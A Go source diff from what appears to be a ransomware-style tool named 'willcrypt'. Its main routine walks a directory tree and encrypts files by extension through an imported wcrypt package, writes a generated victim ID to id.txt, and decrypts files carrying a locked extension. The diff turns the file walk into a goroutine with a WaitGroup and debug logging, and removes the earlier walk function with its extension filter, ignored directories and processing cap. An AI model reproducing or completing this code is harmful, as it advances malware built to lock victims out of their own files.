@@ -2,18 +2,15 @@ package main
 
 import (
 	"crypto/rsa"
-	"sync/atomic"
+	"sync"
 
 	"fmt"
 	"io"
 	"os"
-	"path/filepath"
 	"strings"
 
 	"github.com/spf13/pflag"
-	"github.com/sywc670/willcrypt/internal/config"
 	"github.com/sywc670/willcrypt/internal/utils"
-	"github.com/sywc670/willcrypt/pkg/gowalk"
 	"github.com/sywc670/willcrypt/pkg/wcrypt"
 )
 
@@ -29,6 +26,7 @@ func main() {
 	pflag.Parse()
 	var shouldEncrypt bool
 	var priv *rsa.PrivateKey
+	var wg sync.WaitGroup
 
 	idFile, err := os.Open("id.txt")
 
@@ -59,13 +57,17 @@ func main() {
 
 	encryptionOrDecryption := func(filepath string, isEncrypted bool) {
 		if shouldEncrypt && !isEncrypted {
+			debug("Use encryption")
 			wcrypt.Encrypt(filepath, priv)
 		} else {
+			debug("Use decryption")
 			wcrypt.Decrypt(filepath, priv)
 		}
 	}
 
-	walk(startDir, encryptionOrDecryption)
+	wg.Add(1)
+	debug("Start Walk")
+	go walk(startDir, &wg, encryptionOrDecryption)
 
 	if shouldEncrypt {
 		id := utils.GenerateID()
@@ -79,37 +81,6 @@ func main() {
 
 		os.WriteFile("id.txt", []byte(data), 0777)
 	}
-}
-
-func walk(startDir string, fn func(string, bool)) {
-	var count int32
-
-	filter := func(filePath string, args ...any) {
-		var proceed bool
-
-		for _, ext := range config.Extensions {
-			if strings.HasSuffix(filePath, ext) || strings.HasSuffix(filePath, config.LockedExtension) {
-				proceed = true
-				break
-			}
-		}
-
-		for _, dir := range config.IgnoreDirs {
-			if strings.Contains(filepath.Dir(filePath), dir) {
-				proceed = false
-				break
-			}
-		}
-
-		if proceed && count < config.ProcessMax {
-			atomic.AddInt32(&count, 1)
-
-			isEncrypted := strings.HasSuffix(filePath, config.LockedExtension)
-
-			fn(filePath, isEncrypted)
-		}
-
-	}
-
-	gowalk.Walk(startDir, filter)
+	wg.Wait()
+	debug("Done...")
 }
